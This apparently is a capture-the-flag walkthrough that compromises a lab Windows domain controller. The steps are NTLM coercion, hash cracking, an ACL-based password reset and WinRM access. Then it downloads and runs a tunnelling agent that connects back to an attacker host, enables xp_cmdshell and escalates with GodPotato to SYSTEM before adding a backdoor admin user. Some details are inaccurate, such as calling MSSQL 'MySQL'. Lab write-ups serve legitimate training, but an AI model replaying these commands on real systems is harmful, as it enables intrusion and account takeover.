---

tags:
  - HackSmarter
  - "#ShareThePain"
  - Machine_Walkthrough
  - Rooted

---

## Create Working Directory

```bash
mkdir ~/Labs/HackSmarter/ShareThePain
```
## Initial Enumeration

```bash
rustscan -a 10.0.19.80 | deluge -A --threads 10 --export-format txt
```

```bash
Deluge Scan Summary
==================================================
Nmap Version: Interactive
Arguments:    -A
Start Time:   2026-04-19 15:27:23
Elapsed:      N/A seconds
Hosts Found:  1

Host: 10.0.19.80
Status: up
OS: Microsoft Windows Server 2022
PORT      STATE  SERVICE  VERSION
593/tcp   open   ncacn_http Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3269/tcp  open   tcpwrapped
88/tcp    open   kerberos-sec Microsoft Windows Kerberos
135/tcp   open   msrpc    Microsoft Windows RPC
389/tcp   open   ldap     Microsoft Windows Active Directory LDAP
464/tcp   open   kpasswd5
53/tcp    open   domain   Simple DNS Plus
445/tcp   open   microsoft-ds
139/tcp   open   netbios-ssn Microsoft Windows netbios-ssn
5985/tcp  open   http     Microsoft HTTPAPI httpd 2.0
|_ http-title: Not Found
|_ http-server-header: Microsoft-HTTPAPI/2.0
3268/tcp  open   ldap     Microsoft Windows Active Directory LDAP
3389/tcp  open   ms-wbt-server Microsoft Terminal Services
|_ ssl-cert: Subject: commonName=DC01.hack.smarter
Not valid before: 2026-04-15T00:55:51
Not valid after:  2026-10-15T00:55:51
|_ ssl-date: 2026-04-19T19:27:58+00:00; 0s from scanner time.
|_ rdp-ntlm-info:
  Target_Name: HACK
  NetBIOS_Domain_Name: HACK
  NetBIOS_Computer_Name: DC01
  DNS_Domain_Name: hack.smarter
  DNS_Computer_Name: DC01.hack.smarter
  DNS_Tree_Name: hack.smarter
  Product_Version: 10.0.20348
  System_Time: 2026-04-19T19:27:53+00:00
9389/tcp  open   mc-nmf   .NET Message Framing
47001/tcp open   http     Microsoft HTTPAPI httpd 2.0
|_ http-title: Not Found
|_ http-server-header: Microsoft-HTTPAPI/2.0
49675/tcp open   ncacn_http Microsoft Windows RPC over HTTP 1.0
49671/tcp open   msrpc    Microsoft Windows RPC
49664/tcp open   msrpc    Microsoft Windows RPC
49665/tcp open   msrpc    Microsoft Windows RPC
49672/tcp open   msrpc    Microsoft Windows RPC
49679/tcp open   msrpc    Microsoft Windows RPC
49667/tcp open   msrpc    Microsoft Windows RPC
49706/tcp open   msrpc    Microsoft Windows RPC
49717/tcp open   msrpc    Microsoft Windows RPC
49666/tcp open   msrpc    Microsoft Windows RPC
49676/tcp open   msrpc    Microsoft Windows RPC
49827/tcp open   msrpc    Microsoft Windows RPC
```

> [!warning] This is a Windows Machine so we need to add information to the /etc/hosts
> - 10.0.19.80 DC01.hack.smarter

```bash
tail /etc/hosts
```

```bash
10.0.19.80      DC01.hack.smarter
```

## Windows Enumeration

```bash
maelstrom 10.0.19.80 -A -o initial_enumeration.txt
```

```bash
[+] Target is a Domain Controller
  Hostname:        DC01
  FQDN:            DC01.hack.smarter
  NetBIOS Domain:  HACK
  DNS Domain:      hack.smarter

[+] Server allows authentication via username '' and password ''

[+] Found OS information via SMB
  OS: Windows Server 2022 Build 20348 x64
  OS version: '2022'
  Architecture: x64
  OS build: '20348'

RDP CONFIGURATION
--------------------------------------------------
  [+] RDP: Enabled
  [*] Hostname: DC01
  [+] NLA: Required
      Network Level Authentication protects against some attacks

[+] RDP is enabled on target

ACCESSIBLE SHARES (1)
Share           Access       Comment
--------------- ------------ ------------------------------
Share           READ,WRITE

NO ACCESS (5)
Share           Comment
--------------- ------------------------------
ADMIN$          Remote Admin
C$              Default share
IPC$            Remote IPC
NETLOGON        Logon server share
SYSVOL          Logon server share
```

Looks like all we have right now is a single writable share so lets use [Lure](https://github.com/Real-Fruit-Snacks/Lure) to try and coerce NTLM authentication from any user that browses the share.

## Coerce NTLM Authentication using Lure

> [!info]
>
> - Tool: [Lure](https://github.com/Real-Fruit-Snacks/Lure)

```bash
lure -r 10.0.19.80 -l 10.200.46.199 -d hack.smarter -i tun0 -a share -A
```

> [!important] We got a bite from `bob.ross`

We need to add this name to our username file and make a file to add the hash to.

### Got a Bite

```bash
bob.ross::HACK:da4fbe8964411712:0F5614756D0418789E59F5B704D8A120:010100000000000080C2C62D1AD0DC011335D51EE7443D9D0000000002000800460051005100350001001E00570049004E002D0059005A0042004100370047004A0054005A004500330004003400570049004E002D0059005A0042004100370047004A0054005A00450033002E0046005100510035002E004C004F00430041004C000300140046005100510035002E004C004F00430041004C000500140046005100510035002E004C004F00430041004C000700080080C2C62D1AD0DC0106000400020000000800300030000000000000000100000000200000594E24D693467666C4BAEA7136CA3D596D90DBFFCF327E20938C634CE84693900A001000000000000000000000000000000000000900240063006900660073002F00310030002E003200300030002E00340036002E003100390039000000000000000000
```

Now that we have this we need to crack it to get the password.

```bash
hashcat -m 5600 hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule
```

> [!important] Cracked `bob.ross` hash to get the password `137Password123!@#`

```bash
137Password123!@#
```

Now that we have a username and known password we will add these to our known_users file and do enumeration again with maelstrom.

## Windows Enumeration for `bob.ross`

```bash
maelstrom 10.0.19.80 -C known_users -A -o bob.ross_enumeration.txt --copy-paste
```

We have done this scan earlier with no users, so this time we will only put down the information that is new and that will be useful to us. This time I have added the _--copy-paste_ flag so we can populate our username file if we get anything back.

```bash
[*] Credentials ...... 2 validated user(s)
  Standard Users:
    - NULL SESSION (null)
    - bob.ross (password)

Built-in Accounts (3)
RID     Username                Description
------  ----------------------  ----------------------------------------
500     Administrator           Built-in account for administering th...
501     Guest                   account for guest access to the compu...
502     krbtgt                  Key Distribution Center Service Account

Computer Accounts (1)
RID     Username                Description
------  ----------------------  ----------------------------------------
1000    DC01$

Standard Users (3)
RID     Username                Description
------  ----------------------  ----------------------------------------
1103    bob.ross
1104    alice.wonderland
1105    tyler.ramsey

ACCESSIBLE SHARES (4)
Share           Access       Comment
--------------- ------------ ------------------------------
IPC$            READ         Remote IPC
NETLOGON        READ         Logon server share
Share           READ,WRITE
SYSVOL          READ         Logon server share

NO ACCESS (2)
Share           Comment
--------------- ------------------------------
ADMIN$          Remote Admin
C$              Default share

Domain password information:
  Password history length: 24
  Minimum password length: 7 ← Weak!
  Minimum password age: 1 day 4 minutes
  Maximum password age: 41 days 23 hours 53 minutes
  Password properties:
  - DOMAIN_PASSWORD_COMPLEX: 000001
Domain lockout information:
  Lockout observation window: 30 minutes
  Lockout duration: 30 minutes
  Lockout threshold: None

Extended Policy Information (from verbose output):
  Reversible Encryption: Disabled

[!] Found 1 account(s) with PASSWD_NOTREQD flag:

  Enabled Accounts (HIGH RISK):
    Guest

# ------------------------------------------------------------------- #

================================================================================
                                COPY-PASTE LISTS
================================================================================

Targets (Enumerated) (1):
------------------------------
10.0.19.80

Usernames (7):
------------------------------
administrator
alice.wonderland
bob.ross
dc01$
guest
krbtgt
tyler.ramsey

Usernames (DOMAIN\user) (7):
------------------------------
hack.smarter\administrator
hack.smarter\alice.wonderland
hack.smarter\bob.ross
hack.smarter\dc01$
hack.smarter\guest
hack.smarter\krbtgt
hack.smarter\tyler.ramsey

Group Names (21):
------------------------------
Allowed RODC Password Replication Group
Cert Publishers
Cloneable Domain Controllers
Denied RODC Password Replication Group
DnsAdmins
DnsUpdateProxy
Domain Admins
Domain Computers
Domain Controllers
Domain Guests
Domain Users
Enterprise Admins
Enterprise Key Admins
Enterprise Read-only Domain Controllers
Group Policy Creator Owners
Key Admins
Protected Users
RAS and IAS Servers
Read-only Domain Controllers
SQLServer2005SQLBrowserUser$DC01
Schema Admins

Share Names (6):
------------------------------
ADMIN$
C$
IPC$
NETLOGON
SYSVOL
Share

Share UNC Paths (6):
------------------------------
\10.0.19.80\ADMIN$
\10.0.19.80\C$
\10.0.19.80\IPC$
\10.0.19.80\NETLOGON
\10.0.19.80\SYSVOL
\10.0.19.80\Share

DC Hostnames (1):
------------------------------
DC01.hack.smarter

DC IPs (1):
------------------------------
10.0.19.80

Computer Names (1):
------------------------------
DC01

Server Names (1):
------------------------------
DC01

PASSWD_NOTREQD Accounts (1):
------------------------------
guest

AdminCount=1 Accounts (3):
------------------------------
administrator
krbtgt
tyler.ramsey

Network Interface IPs (2):
------------------------------
10.0.19.80
fe80::99db:b3d5:3974:681f

Valid Credentials (user:password) (2):
------------------------------
NULL SESSION:(no secret)
bob.ross:137Password123!@#
```

Lets spider the shares now that we have more access.

```bash
nxc smb 10.0.19.80 -u 'bob.ross' -p '137Password123!@#' -d 'hack.smarter' -M spider_plus -o OUTPUT_FOLDER=. MAX_FILE_SIZE=10485760 DOWNLOAD_FLAG=True
```

> Nothing of interest was found. Our initial scan had multiple ports open earlier, lets pivot to checking if `bob.ross` credentials work anywhere else.

## Rapids Credential Spraying

> [!info] Tool: [Rapids](https://github.com/Real-Fruit-Snacks/Rapids)

```bash
rapids -t 10.0.19.80 -C known_users --verify --commands
```

> Verify will test the credentials and look for a response, but commands will give us the commands we need to manually test the services.

```bash
                                                                     Valid Credentials
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ Service  ┃ Target         ┃ Username ┃ Password          ┃ Proof                                                                                         ┃
┡━━━━━━━━━━╇━━━━━━━━━━━━━━━━╇━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
│ kerberos │ 10.0.19.80:88  │ bob.ross │ 137Password123!@# │ TGT obtained for bob.ross@hack.smarter                                                        │
│ ldap     │ 10.0.19.80:389 │          │                   │ namingContexts=['DC=hack,DC=smarter', 'CN=Configuration,DC=hack,DC=smarter',                  │
│          │                │          │                   │ 'CN=Schema,CN=Configuration,DC=hack,DC=smarter', 'DC=DomainDnsZones,DC=hack,DC=smarter',      │
│          │                │          │                   │ 'DC=ForestDnsZones,DC=hack,DC=smarter']                                                       │
│ smb      │ 10.0.19.80:445 │          │                   │ Shares: ADMIN$, C$, IPC$, NETLOGON, Share, SYSVOL                                             │
│ wmi      │ 10.0.19.80:135 │          │                   │ hack.smarter\bob.ross:137Password123!@#                                                       │
└──────────┴────────────────┴──────────┴───────────────────┴───────────────────────────────────────────────────────────────────────────────────────────────┘

  1 unique credential(s) across 4 service(s).

  Connect Commands

  # bob.ross@10.0.19.80 (kerberos, nxc_ldap, nxc_rdp, nxc_smb, nxc_wmi)
  impacket-getTGT hack.smarter/bob.ross:'137Password123!@#' -dc-ip 10.0.19.80
  ldapsearch -x -H ldap://10.0.19.80:389 -D 'bob.ross@hack.smarter' -w '137Password123!@#' -b '' -s base namingContexts
  ldapsearch -x -H ldap://10.0.19.80:389 -D 'bob.ross@hack.smarter' -w '137Password123!@#' -b 'DC=hack,DC=smarter' '(objectClass=user)' sAMAccountName  # requires domain (base DN)
  xfreerdp /v:10.0.19.80:3389 /u:bob.ross /p:'137Password123!@#' /cert:ignore
  smbclient -L //10.0.19.80 -U 'hack.smarter\bob.ross%137Password123!@#'
  impacket-smbexec hack.smarter/bob.ross:'137Password123!@#'@10.0.19.80  # requires local admin
  impacket-psexec hack.smarter/bob.ross:'137Password123!@#'@10.0.19.80  # requires local admin
  smbclient //10.0.19.80/C$ -U 'hack.smarter\bob.ross%137Password123!@#'  # requires local admin
  impacket-wmiexec hack.smarter/bob.ross:'137Password123!@#'@10.0.19.80  # requires local admin
```

> We are unable to utilize any of these services. Lets move onto bloodhound to learn more about the network.

## BloodHound Enumeration

We need to enumerate the active directory network further. We will run RustHound-CE and then analyze the results using runoff, but runoff will require bloodhound-CE running.

### Install Bloodhound-CE

> [!info] Tool: [Bloodhound-CE](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)

```bash
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
```

```bash
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
```

```bash
./bloodhound-cli install
```

```bash
[+] BloodHound is ready to go!
[+] You can log in as `admin` with this password: uHf8oMW1bXWF3U5DEulCJne9cugnPHDZ
[+] You can get your admin password by running: bloodhound-cli config get default_password
[+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login
```

Now lets open the web browser and login.

```bash
firefox http://127.0.0.1:8080/ui/login &
# Username: admin
# Password: uHf8oMW1bXWF3U5DEulCJne9cugnPHDZ
```

Now lets run rusthound to get the information we need for bloodhound-ce

### RustHound-CE

```bash
rusthound-ce -d hack.smarter -u bob.ross -p '137Password123!@#' -i 10.0.19.80   -z -o .
```

```bash
---------------------------------------------------
Initializing RustHound-CE at 17:38:06 on 04/19/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-04-19T21:38:06Z INFO  rusthound_ce] Verbosity level: Info
[2026-04-19T21:38:06Z INFO  rusthound_ce] Collection method: All
[2026-04-19T21:38:06Z INFO  rusthound_ce::ldap] Connected to HACK.SMARTER Active Directory!
[2026-04-19T21:38:06Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-04-19T21:38:06Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-04-19T21:38:06Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=hack,DC=smarter
[2026-04-19T21:38:06Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-04-19T21:38:07Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=hack,DC=smarter
[2026-04-19T21:38:07Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-04-19T21:38:07Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=hack,DC=smarter
[2026-04-19T21:38:07Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-04-19T21:38:07Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=hack,DC=smarter
[2026-04-19T21:38:07Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-04-19T21:38:07Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=hack,DC=smarter
[2026-04-19T21:38:07Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-04-19T21:38:07Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10
[2026-04-19T21:38:07Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-04-19T21:38:07Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-04-19T21:38:07Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-04-19T21:38:07Z INFO  rusthound_ce::json::maker::common] 7 users parsed!
[2026-04-19T21:38:07Z INFO  rusthound_ce::json::maker::common] 61 groups parsed!
[2026-04-19T21:38:07Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-04-19T21:38:07Z INFO  rusthound_ce::json::maker::common] 1 ous parsed!
[2026-04-19T21:38:07Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-04-19T21:38:07Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-04-19T21:38:07Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
[2026-04-19T21:38:07Z INFO  rusthound_ce::json::maker::common] ./20260419173807_hack-smarter_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 17:38:07 on 04/19/26! Happy Graphing!

```

> Now we need to injest this data into bloodhound-ce and use the runoff tool to analyze the nodes.

### Runoff (BloodHound-CE Analyzer)

We need to mark accounts we _own_ so bloodhound can give us proper information

```bash
runoff -p 'bloodhoundcommunityedition' mark owned 'bob.ross@hack.smarter'
```

Now lets run all queries with the quiet options so we don't have to sift through empty output and the abuse flag will give us the commands to take advantage of anything found.

```bash
runoff -p 'bloodhoundcommunityedition' -q --abuse run all
```

> [!Important] Critical Findings from the output

```bash
[*] [CRITICAL] GenericAll ACL Abuse
    Found 2 GenericAll relationship(s) from non-admin principals (limit 200)
╭──────────────────────────────┬───────┬───────────────────────────────┬─────────────┬─────────┬───────╮
│ Principal                    │ Type  │ Target                        │ Target Type │ Status  │ Admin │
├──────────────────────────────┼───────┼───────────────────────────────┼─────────────┼─────────┼───────┤
│ CERT PUBLISHERS@HACK.SMARTER │ Group │ AIA@HACK.SMARTER              │ Container   │ Enabled │ No    │
├──────────────────────────────┼───────┼───────────────────────────────┼─────────────┼─────────┼───────┤
│ BOB.ROSS@HACK.SMARTER        │ User  │ ALICE.WONDERLAND@HACK.SMARTER │ User        │ Enabled │ No    │
╰──────────────────────────────┴───────┴───────────────────────────────┴─────────────┴─────────┴───────╯
```

#### Abusing GenricAll ACL

```bash
bloodyAD -d HACK.SMARTER -u 'bob.ross' -p '137Password123!@#' --host 10.0.19.80 set password ALICE.WONDERLAND 'Passw0rd!2025'
```

> [!important] `[+] Password changed successfully!`

Now we need to add this user to our known_users file and then mark this user as owed in the database.

```bash
runoff -p 'bloodhoundcommunityedition' mark owned 'alice.wonderland@hack.smarter'
```

> I am not seeing anything right away, lets use this new users creds to enumerate the AD with maelstrom.

```bash
maelstrom 10.0.19.80 -u 'alice.wonderland' -p 'Passw0rd!2025' -A -o alice_enumeration.txt
```

We only need to annotate new findings. We have ran this already on bob.ross and null.... and there was nothing new, lets try Rapids

```bash
rapids -t 10.0.19.80 -C known_users --verify --commands
```

```bash
                                                                     Valid Credentials
┏━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ Service    ┃ Target          ┃ Username         ┃ Password          ┃ Proof                                                                              ┃
┡━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
│ evil-winrm │ 10.0.19.80:5985 │ alice.wonderland │ Passw0rd!2025     │ hack\alice.wonderland | DC01                                                       │
│ kerberos   │ 10.0.19.80:88   │                  │                   │ TGT obtained for alice.wonderland@hack.smarter                                     │
│ ldap       │ 10.0.19.80:389  │                  │                   │ namingContexts=['DC=hack,DC=smarter', 'CN=Configuration,DC=hack,DC=smarter',       │
│            │                 │                  │                   │ 'CN=Schema,CN=Configuration,DC=hack,DC=smarter',                                   │
│            │                 │                  │                   │ 'DC=DomainDnsZones,DC=hack,DC=smarter', 'DC=ForestDnsZones,DC=hack,DC=smarter']    │
│ smb        │ 10.0.19.80:445  │                  │                   │ Shares: ADMIN$, C$, IPC$, NETLOGON, Share, SYSVOL                                  │
│ wmi        │ 10.0.19.80:135  │                  │                   │ wmi bind OK                                                                        │
├────────────┼─────────────────┼──────────────────┼───────────────────┼────────────────────────────────────────────────────────────────────────────────────┤

  Connect Commands

  # alice.wonderland@10.0.19.80 (evil-winrm, kerberos, ldap, smb, wmi)
  evil-winrm -i 10.0.19.80 -u alice.wonderland -p 'Passw0rd!2025'
  impacket-getTGT hack.smarter/alice.wonderland:'Passw0rd!2025' -dc-ip 10.0.19.80
  ldapsearch -x -H ldap://10.0.19.80:389 -D 'alice.wonderland@hack.smarter' -w 'Passw0rd!2025' -b '' -s base namingContexts
  ldapsearch -x -H ldap://10.0.19.80:389 -D 'alice.wonderland@hack.smarter' -w 'Passw0rd!2025' -b 'DC=hack,DC=smarter' '(objectClass=user)' sAMAccountName
# requires domain (base DN)
  smbclient -L //10.0.19.80 -U 'hack.smarter\alice.wonderland%Passw0rd!2025'
  impacket-smbexec hack.smarter/alice.wonderland:'Passw0rd!2025'@10.0.19.80  # requires local admin
  impacket-psexec hack.smarter/alice.wonderland:'Passw0rd!2025'@10.0.19.80  # requires local admin
  smbclient //10.0.19.80/C$ -U 'hack.smarter\alice.wonderland%Passw0rd!2025'  # requires local admin
  impacket-wmiexec hack.smarter/alice.wonderland:'Passw0rd!2025'@10.0.19.80  # requires local admin
```

> [!important] Looks like we can connect with evil-winrm. So lets do that and upload something to get a stable shell.

```bash
evil-winrm -i 10.0.19.80 -u alice.wonderland -p 'Passw0rd!2025'
```

```bash
# it Works
whoami

hack\alice.wonderland
```

After doing some light enumeration we see MySQL is listening on 127.0.1:1433

## Using ligolo for better pivoting

> [!info] Tool: [LigoloSupport](https://github.com/Real-Fruit-Snacks/LigoloSupport)

```bash
curl -O https://raw.githubusercontent.com/Real-Fruit-Snacks/LigoloSupport/main/ligolo-helper.sh
chmod +x ligolo-helper.sh
```

```bash
sudo ./ligolo-helper.sh auto
```

```bash
# Uploaded binary to target
iwr http://10.200.46.199:8000/ligolo-agent.exe -o a.exe
```

```bash
# Executed
.\a.exe -connect 10.200.46.199:11601 -ignore-cert
```

```bash
# added routes
/opt/ligolosupport/ligolo-helper.sh add-route 10.10.10.0/24

ip route add 240.0.0.1/32 dev ligolo
```

> Now lets use our access to try and talk to the internal MySQL

```bash
impacket-mssqlclient 'HACK.SMARTER/alice.wonderland:Passw0rd!2025@240.0.0.1' -windows-auth
```

> I'm In...

```bash
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (HACK\alice.wonderland  dbo@master)>
```

> [!important] enable_xp_cmdshell

```bash
enable_xp_cmdshell
```

> It works... if it didn't I would have tried

```bash
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

### Check MySQL Privs

```bash
xp_cmdshell "whoami"
```

```bash
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

> [!important] SeImpersonatePrivilege is Enabled

## God Potato to PrivEsc from MySQL

> [!info] Tool: [GodPotato](https://github.com/BeichenDream/GodPotato/releases)

I uploaded GodPotato using Evil-Winrm. Now I need to execute Undertow to catch a callback from inside the MySQL Shell

```bash
# Move File to World Readable
copy C:\Temp\undertow.exe C:\Windows\System32\spool\drivers\color\undertow.exe
```

```bash
xp_cmdshell "C:\Windows\System32\spool\drivers\color\undertow.exe"
```

> Caught Callback

```bash
ssh -MS /tmp/mysql a@127.0.0.1 -p 46005
```

> I am in as mssql

```bash
# whoami
nt service\mssql$sqlexpress
```

> I moved GodPotato to this same directory.

```bash
PS C:\Windows\system32> C:\Windows\System32\spool\drivers\color\God.exe -cmd whoami
[*] CombaseModule: 0x140731942240256
[*] DispatchTable: 0x140731944830840
[*] UseProtseqFunction: 0x140731944123184
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \.\pipe\90663cf6-9a93-479e-9a20-78784ed2fe8f\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000a402-0944-ffff-adb1-86dc5858104f
[*] DCOM obj OXID: 0x3bd6b0be262abf2a
[*] DCOM obj OID: 0x6a15bb0816f2651f
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 928 Token:0x660  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 3672
nt authority\system
```

> [!important] got nt authority\\system

## Create New User

```bash
# Create User
C:\Windows\System32\spool\drivers\color\God.exe -cmd "net user hacksmarter hacksmart1! /add"
```

```bash
# Make Admin
C:\Windows\System32\spool\drivers\color\God.exe -cmd "net localgroup administrators hacksmarter /add"
```

```bash
evil-winrm -i 10.0.19.80 -u hacksmarter -p 'hacksmart1!'
```

> Got the Root Flag... `YWxsIGFib3V0IHRoYXQgcm9vdCwgYm91dCB0aGF0IHJvb3QsIEpVU1QgREEK`

